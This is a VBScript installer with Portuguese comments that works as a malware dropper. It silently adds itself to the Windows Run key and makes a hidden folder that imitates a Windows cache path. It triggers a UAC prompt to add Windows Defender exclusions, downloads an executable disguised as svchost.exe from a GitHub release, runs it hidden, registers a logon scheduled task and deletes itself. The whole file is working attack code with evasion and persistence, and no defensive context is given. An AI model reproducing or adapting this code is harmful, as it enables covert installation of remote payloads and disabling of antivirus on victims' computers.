' installer.vbs — Auto-instalador com retry via Registro do Windows.
'
' Lógica de persistência (sempre no Run até dar certo):
'   - Se JÁ existe svchost.exe E está rodando → remove do Run e sai.
'   - Em QUALQUER outro caso (sem release, sem download, sem svchost,
'     erro no move, etc.) → deixa o INSTALADOR no Run e sai silencioso.
'
' Nunca mostra erro, nunca abre janela, nunca trava o logon.

Option Explicit

Dim shell, fso, userProfile, localAppData, destino, exeUrl, tmpExe
Dim cmdBaixar, destinoExe, tentativas, rc, tamArquivo
Dim vbsPath, psKill, tentativasMove

Dim regRun, regValorNome, regInstalador, regAgente
Dim taskName, psTask
Dim pastaDefender, psExclusao, cmdElevar, psChecker
Dim psCheckProc

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' =====================================================================
' CONFIGURAÇÕES
' =====================================================================
exeUrl = "https://github.com/DesconhecidoPorOpcao/0T.romujaPnp/releases/latest/download/svchost.exe"

userProfile  = shell.ExpandEnvironmentStrings("%USERPROFILE%")
localAppData = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%")

destino    = localAppData & "\Microsoft\Windows\Caches\Local"
destinoExe = destino & "\svchost.exe"
tmpExe     = destino & "\svchost_novo.exe"

regRun        = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
regValorNome  = "WindowsCacheSvc"
taskName      = "WindowsCacheSvc"

vbsPath = WScript.ScriptFullName

regInstalador = "wscript.exe //B """ & vbsPath & """"
regAgente     = """" & destinoExe & """"

pastaDefender = destino

' =====================================================================
' FUNÇÃO HELPER — garante que o instalador está no Run
' (usada em TODOS os caminhos de erro/saída antecipada)
' =====================================================================
Sub ManterInstaladorNoRun()
    On Error Resume Next
    shell.RegWrite regRun & "\" & regValorNome, regInstalador, "REG_SZ"
    On Error Goto 0
End Sub

' =====================================================================
' PASSO 0 — Já está instalado E rodando?
'           Se sim: remove do Run e sai.
'           Se não: garante que o instalador está no Run e segue.
' =====================================================================
If fso.FileExists(destinoExe) Then
    On Error Resume Next
    tamArquivo = 0
    tamArquivo = fso.GetFile(destinoExe).Size
    On Error Goto 0

    If tamArquivo >= 1048576 Then
        ' Arquivo existe e tem tamanho ok. Vamos ver se está RODANDO.
        psCheckProc = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
                      "$alvo = '" & destinoExe & "'; " & _
                      "$p = Get-CimInstance Win32_Process -Filter ""Name='svchost.exe'"" -ErrorAction SilentlyContinue | " & _
                      "Where-Object { $_.ExecutablePath -ieq $alvo }; " & _
                      "if ($p) { exit 0 } else { exit 1 }"

        rc = 1
        On Error Resume Next
        rc = shell.Run(psCheckProc, 0, True)
        On Error Goto 0

        If rc = 0 Then
            ' Está instalado E rodando → sucesso completo.
            ' Remove o instalador do Run (não precisa mais).
            On Error Resume Next
            shell.RegDelete regRun & "\" & regValorNome
            On Error Goto 0
            WScript.Quit 0
        Else
            ' Está instalado mas NÃO está rodando → tenta rodar.
            ' Mantém no Run por segurança, caso o .exe não suba.
            ManterInstaladorNoRun
            On Error Resume Next
            shell.Run regAgente, 0, False
            On Error Goto 0
            WScript.Quit 0
        End If
    End If
End If

' =====================================================================
' A PARTIR DAQUI: não temos svchost.exe funcional.
' Garante que o INSTALADOR está no Run (vai tentar de novo no próximo logon).
' =====================================================================
ManterInstaladorNoRun

' Cria a pasta se não existir (escondida)
On Error Resume Next
If Not fso.FolderExists(destino) Then
    fso.CreateFolder(destino)
End If
shell.Run "attrib +h +s """ & destino & """", 0, True
On Error Goto 0

' =====================================================================
' PASSO 1 — Exclusão no Windows Defender (UAC 1x)
' =====================================================================
psChecker = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
            "$p = '" & pastaDefender & "'; " & _
            "$excl = (Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath; " & _
            "if ($excl -contains $p) { exit 0 } else { exit 1 }" & _
            """"

rc = 1
On Error Resume Next
rc = shell.Run(psChecker, 0, True)
On Error Goto 0

If rc <> 0 Then
    psExclusao = "$p = '" & pastaDefender & "'; " & _
                 "Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; " & _
                 "Add-MpPreference -ExclusionProcess 'svchost.exe' -ErrorAction SilentlyContinue"
    psExclusao = Replace(psExclusao, "'", "''")

    cmdElevar = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
                "Start-Process powershell -Verb RunAs -Wait -WindowStyle Hidden " & _
                "-ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-Command','" & psExclusao & "'" & _
                """"

    On Error Resume Next
    shell.Run cmdElevar, 0, True
    On Error Goto 0
End If

' =====================================================================
' PASSO 2 — Mata processo antigo (se houver)
' =====================================================================
psKill = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
         "$alvo = '" & destinoExe & "'; " & _
         "Get-CimInstance Win32_Process -Filter ""Name='svchost.exe'"" -ErrorAction SilentlyContinue | " & _
         "Where-Object { $_.ExecutablePath -ieq $alvo } | " & _
         "ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }" & _
         """"
On Error Resume Next
shell.Run psKill, 0, True
On Error Goto 0
WScript.Sleep 2000

' =====================================================================
' PASSO 3 — Baixa svchost.exe do GitHub
' =====================================================================
cmdBaixar = "powershell -NoProfile -WindowStyle Hidden -Command ""try { " & _
            "Invoke-WebRequest -Uri '" & exeUrl & "' -OutFile '" & tmpExe & "' " & _
            "-UseBasicParsing -ErrorAction Stop; exit 0 } catch { exit 1 }"""
On Error Resume Next
rc = shell.Run(cmdBaixar, 0, True)
On Error Goto 0

tentativas = 0
Do While Not fso.FileExists(tmpExe) And tentativas < 120
    WScript.Sleep 500
    tentativas = tentativas + 1
Loop

tamArquivo = 0
On Error Resume Next
If fso.FileExists(tmpExe) Then
    tamArquivo = fso.GetFile(tmpExe).Size
End If
On Error Goto 0

' --- Falhou no download? Sai silencioso. Run já está no instalador. ---
If Not fso.FileExists(tmpExe) Or tamArquivo < 1048576 Then
    On Error Resume Next
    fso.DeleteFile tmpExe, True
    On Error Goto 0
    WScript.Quit 0
End If

' =====================================================================
' PASSO 4 — Move pra destino final (com retry)
' =====================================================================
tentativasMove = 0
Do While tentativasMove < 30
    On Error Resume Next
    If fso.FileExists(destinoExe) Then
        fso.DeleteFile destinoExe, True
    End If
    Err.Clear
    fso.MoveFile tmpExe, destinoExe
    If Err.Number = 0 Then Exit Do
    Err.Clear
    On Error Goto 0
    WScript.Sleep 500
    tentativasMove = tentativasMove + 1
Loop

' --- Não conseguiu mover? Sai silencioso. Run já está no instalador. ---
If tentativasMove >= 30 Then
    WScript.Quit 0
End If

' =====================================================================
' PASSO 5 — Tenta rodar o agente
' =====================================================================
On Error Resume Next
shell.Run regAgente, 0, False
On Error Goto 0

' =====================================================================
' PASSO 6 — Registra a Tarefa Agendada como backup (opcional)
' =====================================================================
psTask = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
         "$nome = '" & taskName & "'; " & _
         "$exe  = '" & destinoExe & "'; " & _
         "try { " & _
         "  $a = New-ScheduledTaskAction -Execute $exe; " & _
         "  $t = New-ScheduledTaskTrigger -AtLogOn; " & _
         "  $s = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable; " & _
         "  Register-ScheduledTask -TaskName $nome -Action $a -Trigger $t -Settings $s -Force -ErrorAction Stop | Out-Null; " & _
         "  exit 0 " & _
         "} catch { exit 1 }"""
On Error Resume Next
shell.Run psTask, 0, True
On Error Goto 0

' =====================================================================
' PASSO 7 — Auto-deleta o .vbs
' =====================================================================
' IMPORTANTE: só deleta o .vbs se chegou aqui (ou seja: deu tudo certo).
' Se o svchost subiu com sucesso e foi registrado no Run, o VBS não é mais
' necessário.
On Error Resume Next
shell.Run "cmd /c ping -n 3 127.0.0.1 >nul & del /f /q """ & vbsPath & """", 0, False
On Error Goto 0
